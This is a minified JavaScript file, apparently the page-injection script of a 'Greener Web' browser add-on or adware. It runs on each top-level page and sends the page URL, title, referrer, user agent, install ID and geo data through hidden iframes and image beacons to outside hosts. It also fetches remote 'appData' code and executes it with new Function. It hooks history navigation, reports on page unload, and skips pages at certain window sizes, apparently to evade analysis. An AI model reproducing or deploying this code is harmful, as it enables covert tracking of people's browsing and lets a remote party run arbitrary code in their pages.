(function(){function A(b,a,c){if(b instanceof Array){if("undefined"!=typeof Array.prototype.indexOf)return b.indexOf(a,c);c=c||0;var d=b.length;if(c>=d)return-1;for(0>c&&(c=Math.max(d+c,0));c<d;c++)if(b[c]===a)return c}return-1}function B(){for(var b=0;b<I.length;b++){var a=I[b].exec(navigator.userAgent);if(a)return b=a.splice(1,2),2>b.length&&b.push("0"),b}return["Unknown","0"]}function J(b){var a={rawName:"Unknown",rawVersion:"0",name:"Unknown",version:"0"};if(!1==!!b||2>b.length)return a;a.name=
a.rawName=b[0];a.version=a.rawVersion=b[1];b=a.version.indexOf(".");-1!==b&&(a.version=a.version.substring(0,b));b=a.rawName.toLowerCase();switch(b){case "mrchrome":a.name="Amigo";break;case "opr":a.name="Opera";break;case "yabrowser":a.name="Yandex";break;case "ir":a.name="Rocket"}0==b.indexOf("msie")?a.name="MSIE":0==b.indexOf("trident")&&(a.name="MSIE",a.version="11");return a}function s(b,a){if(b.constructor){var c=b.constructor.prototype[a],d=typeof c;if("function"==d||k&&9>k&&"object"==d)return function(){return c.apply(b,
arguments)}}if(k&&8>k&&b===h)try{return eval(Q.join(a))}catch(e){}return b[a]}function r(b,a){var c=g.createElement("script");c.type="text/javascript";c.src=b;c.onload=c.onreadystatechange=function(){if(!this.readyState||"loaded"==this.readyState||"complete"==this.readyState){c.onload=c.onreadystatechange=null;c.parentNode.removeChild(c);try{"function"==typeof a&&a()}catch(b){}}};(g.body||g.head).appendChild(c)}function R(b,a,c){var d=p+1E20*Math.random();h[d]=c;r(b+(0<b.indexOf("?")?"&":"?")+a+"="+
d,function(){try{delete h[d]}catch(a){}})}function C(b,a){for(var c={},d=b.search.substr(1).split("&"),e=0;e<d.length;e++){var m=d[e].split("=");c[decodeURIComponent(m[0])]=2==m.length?decodeURIComponent(m[1]):""}return c[a]}function t(b){for(var a=[],c=0;c<b.length;c++)a.push(encodeURIComponent(b[c].toString().replace(/,/g,"$cma;")));g.images&&((new Image).src=S+a.shift()+"="+a.join("|,|"))}function T(b){var a;window.history&&(a=window.history,D=a.pushState,a.pushState=function(c){"function"==typeof a.a&&
a.a({state:c});b();return D.apply(a,arguments)})}function v(b,a,c){if(b.addEventListener)return b.addEventListener(a,c,!1);if(b.attachEvent)return b.attachEvent("on"+a,c)}function w(b,a,c){if(b.removeEventListener)return b.removeEventListener(a,c,!1);if(b.detachEvent)return b.detachEvent("on"+a,c)}function U(b){if("function"==typeof K)return K(b);for(var a,c=0,d=x,e="";b.charAt(c|0)||(d="=",c%1);e+=d.charAt(63&a>>8-c%1*8))a=a<<8|b.charCodeAt(c-=-.75);return e}function V(b){for(var a=0,c="";a<b.length;)var d=
parseInt(b.charAt(a++),16)<<8|parseInt(b.charAt(a++),16)<<4|parseInt(b.charAt(a++),16),e=d&63,c=c+x.charAt(d>>6),c=c+x.charAt(e);for(;c.length%4;)c+=x.charAt(64);return c}function W(b){function a(a,d){try{y[b]=d?a+"-"+d:a}catch(e){}}return{abort:function(b){a("abort",b)},exception:function(b){a("exception",b)},success:function(b){a("success",b)}}}function X(b,a,c,d){var e=W(d);return function(){try{(new Function("client","defaultSettings","customSettings","report",c))(f,b,a,e)}catch(d){e.exception(d)}}}
function L(b){for(var a=0;a<b.length;a++){var c=b[a];M(X(c.defaultSettings,c.customSettings,c.init,c.id),0)}}function E(){w(h,"unload",E);var b;window.history&&(b=window.history,b.pushState=D);if(!(.1<Math.random())){b=[];for(var a in y)y.hasOwnProperty(a)&&b.push(a+":"+y[a]);a=f.geo&&"string"==typeof f.geo.countryCode?f.geo.countryCode.toLowerCase():"";b=["InitState",f.guid,g.location.host,g.location.href].concat(B(),a,f.urlCategories?f.urlCategories.join("|"):"",b.join("|"),(new Date).getTime());
t(b)}}function N(){for(var b=p+"_1",a=b,c="https:"==g.location.protocol,d=g.getElementsByTagName("script"),e=0;e<d.length;e++)if(-1<d[e].src.indexOf(Y+"/gsrs")&&"1"!=d[e].getAttribute("d")&&(a=g.createElement("a"),a.href=d[e].src,f.guid=C(a,"g"),f.installSource=C(a,"is"),n=C(a,"bp"),a=b+n,l=g.getElementById(a),!l)){d[e].setAttribute("d","1");break}var e=g.getElementById(b),m=d=!1;e?(d=!1,b=e.getAttribute("t"),-1==b.split("|").indexOf(n)&&(e.setAttribute("t",b+"|"+n),m=!0)):(e=g.createElement("iframe"),
e.id=b,e.setAttribute("t",n),e.style.width="1px",e.style.height="1px",e.style.display="none",g.body.appendChild(e),d=m=!0);m&&(e=J(B()),t(["Runtime_Ran_2",p,f.guid,n,e.name.substr(0,1E3),e.version.substr(0,1E3),c]));a:for(c=g.title||"",e=0;e<O.length;e++)if(O[e].test(c)){c="";break a}c=c.substr(0,1E3);b=[[790,482,0,0],[1024,704,0,0],[1024,697,-8,-8],[1024,706,0,0],[1024,670,0,0],[790,446,0,0],[1024,707,0,0],[1024,669,0,0],[790,518,0,0],[1024,670,0,0],[1024,671,0,0],[1024,632,0,0],[1024,633,0,0],[752,
478,4,4],[1024,668,0,0],[1024,666,0,0],[1024,702,0,0]];e=0;for(m=b.length;e<m;e++)if(h.innerWidth==b[e][0]&&h.innerHeight==b[e][1]&&h.screenX==b[e][2]&&h.screenY==b[e][3])return t(["SkippedRender_1",f.guid||"",p,c,h.location.href.substr(0,4E3),"Platform"]);l=g.createElement("iframe");l.id=a;l.style.width="1px";l.style.height="1px";l.style.display="none";l.src="https:"+F+"/gscf?n="+encodeURIComponent((h.name||"").substr(0,1E3))+"&t="+encodeURIComponent(c)+"&r="+encodeURIComponent((g.referrer||"").substr(0,
4E3))+"&g="+encodeURIComponent(f.guid||"")+"&is="+encodeURIComponent(f.installSource||"")+"&bp="+encodeURIComponent(n||"BF")+"&l="+encodeURIComponent(!0==d?"1":"0");l.setAttribute("t",n);g.body.appendChild(l)}function Z(b){try{var a=b.data;"string"==typeof a&&(a=q.parse(a));if(a.ext&&a.ext==p){if(l&&b.source==l.contentWindow)if("userdata"==a.msg&&a.installSource&&a.appData){f.installSource=a.installSource;f.ip=a.ip;f.geo=a.geo;f.bid=a.bucketId;f.token=a.token;G=a.appData;for(var c=0;c<G.length;c++){var d=
G[c];d.id==$&&(f.tc=!0);(d.blacklistCategories.length||d.whitelistCategories.length||!d.skipUrlCategorization?z:H).push(d)}H.length&&L(H);z.length&&(c={ext:p,msg:"getcategory"},l.contentWindow.postMessage(!k||9<k?c:q.stringify(c),"*"));v(h,"unload",E);T(E)}else if("category"==a.msg&&a.categoryData){f.urlCategories=a.categoryData.categories;f.isBadCategory=a.categoryData.isBadCategory;f.isBadUrl=a.categoryData.isBadUrl;f.isBadUrlCategory=f.isBadCategory||f.isBadUrl;for(var c=a.categoryData.categories,
d=[],e=0;e<z.length;e++){var m=z[e],g;a:{for(var n=c,r=m.blacklistCategories,s=m.whitelistCategories,u=0;u<s.length;u++)if(-1<A(n,s[u])){g=!0;break a}for(u=0;u<r.length;u++)if(-1<A(n,r[u])){g=!1;break a}g=!s.length||!!r.length}g&&d.push(m)}d.length&&L(d)}if(b.source==h)if("getguid"==a.msg){var t={ext:p,msg:"guid",guid:f.guid,bf:!0};P(!k||9<k?t:q.stringify(t),"*")}else"statechange"==a.msg&&"number"==typeof a.appid&&"boolean"==typeof a.state&&l.contentWindow.postMessage(!k||9<k?a:q.stringify(a),"https:"+
F)}}catch(w){}}var h=window,l,g=document,q,k=!1,p="Greener Web",F="//api.greenerweb.info",Y="//apigreenerwebinf-a.akamaihd.net",G,n,S="//jsl.infostatsvc.com/?",x="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",Q=["(function () {delete ","; return ",";})()"],D,I=[/\b(IR)\/([\d\.]+)\b/i,/\b(opr)\/([\d\.]+)\b/i,/\b(lunascape)[\/ ]([\d\.]+)\b/i,/\b(maxthon)\/([\d\.]+)\b/i,/\b(yabrowser)\/([\d\.]+)\b/i,/\b(mrchrome)\b/i,/\b(chrome)\/([\d\.]+)\b/i,/\b(msie)\s([\d\.]+)\b/i,
/\b(trident)\/([\d\.]+)\b/i,/\b(firefox)\/([\d\.]+)\b/i,/\b(safari)\/([\d\.]+)\b/i,/\b(opera)\/([\d\.]+)\b/i],$="1065";if(h.top==h){var z=[],H=[],y={},O=[/\b(?:\d[(). -]*?){9,16}\b/,/\b[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\b/i],M=s(h,"setTimeout"),K=s(h,"btoa"),P=s(h,"postMessage"),f=function(){function b(){w(g,"DOMContentLoaded",b);for(w(h,"load",b);a.length;)M(a.pop(),0)}var a=[],c={},d=B();return{productName:p,
webDomain:"greenerweb.info",webCdnDomain:"wwwgreenerwebinf-a.akamaihd.net",es:"2",tc:!1,browser:J(d),utils:{addEventListener:v,arrayIndexOf:A,changeAppState:function(a,b){if("number"==typeof a&&"boolean"==typeof b){var c={ext:p,msg:"statechange",appid:a,state:b};P(!k||9<k?c:q.stringify(c),"*")}},removeEventListener:w,base64EncodeText:U,base64EncodeHex:V,getNativeWindowFunction:s,loadScript:r,loadJSONP:R,log:t,ready:function(c){a.push(c);"complete"==g.readyState?
b():(v(g,"DOMContentLoaded",b),v(h,"load",b))},require:function(a,b,d){switch(a){case "jquery":b=b||"1";c[a]&&c[a][b]?"function"==typeof d&&d(c[a][b]):r("//ajax.googleapis.com/ajax/libs/jquery/"+b+"/jquery.min.js",function(){c[a]=c[a]||{};c[a][b]=h.jQuery.noConflict(!0);"function"==typeof d&&d(c[a][b])});break;case "swfobject":if(b=b||"2",c[a]&&c[a][b])"function"==typeof d&&d(c[a][b]);else{var f=h.swfobject;r("//ajax.googleapis.com/ajax/libs/swfobject/"+b+"/swfobject.js",function(){c[a]=c[a]||{};
c[a][b]=h.swfobject;h.swfObject=f;"function"==typeof d&&d(c[a][b])})}}},setBucketId:function(a,b){if(b instanceof Date){var c={ext:p,msg:"setbucket",bid:a,exp:b.valueOf()};l.contentWindow.postMessage(!k||9<k?c:q.stringify(c),"https:"+F)}}},window:{name:h.name},getInstallId:function(){return this.guid},getClientIP:function(){return this.ip}}}();(function(){var b=g.documentMode,a;try{delete g.documentMode,a=g.documentMode,g.documentMode=b}catch(c){}"number"==typeof a?k=a:"number"==typeof b&&(k=b);v(h,
"message",Z);var d=h.JSON;"object"==typeof d&&"function"==typeof d.stringify&&"function"==typeof d.parse?(q=d,f.utils.JSON=q,f.utils.ready(N)):r("//cdnjs.cloudflare.com/ajax/libs/json3/3.2.4/json3.min.js",function(){q=h.JSON;f.utils.JSON=q;"undefined"!=typeof d&&(h.JSON=d);f.utils.ready(N)})})()}})();